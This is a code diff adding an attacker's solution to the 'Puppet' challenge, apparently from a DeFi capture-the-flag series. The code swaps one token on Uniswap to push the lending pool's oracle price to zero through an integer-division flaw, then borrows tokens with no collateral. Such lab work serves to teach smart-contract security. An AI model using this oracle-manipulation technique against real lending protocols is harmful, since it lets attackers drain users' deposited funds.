@@ -93,6 +93,31 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        let tkn = this.token;
+        let ex = this.uniswapExchange;
+        let _this = this;
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await tkn.approve(
+            ex.address,
+            ether('10000000'),
+            { from: attacker }
+        );
+
+        let sell = async function (amount) {
+            await ex.tokenToEthSwapInput(amount, 1, deadline, { from: attacker });
+        }
+
+        // error is in computeOraclePrice:
+        // we are comparing wei here, and dealing with ints.
+        // just need to sell a minimal amount and the price will slip below 1 -> 0
+        await sell(ether('1'));
+        // so we can borrow for free now.
+        // Don't even need to send any ether!
+        await this.lendingPool.borrow(ether('10000'), { from: attacker });
+
+        // dümp iet!
+        // await sell(await this.token.balanceOf(attacker));
     });
 
     after(async function () {
